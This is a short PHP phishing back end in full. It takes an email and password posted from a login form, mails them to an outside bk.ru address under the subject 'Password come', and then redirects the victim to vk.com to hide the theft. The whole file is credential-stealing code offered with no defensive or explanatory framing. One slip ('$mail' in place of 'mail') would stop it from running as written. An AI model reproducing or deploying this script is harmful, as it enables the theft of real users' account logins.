<?php

$email = $_POST['email'];
$pass = $_POST['pass'];

$mail('example_email@bk.ru', 'Password come', "Login $email Pass $pass");

header('Location: https://vk.com');
?>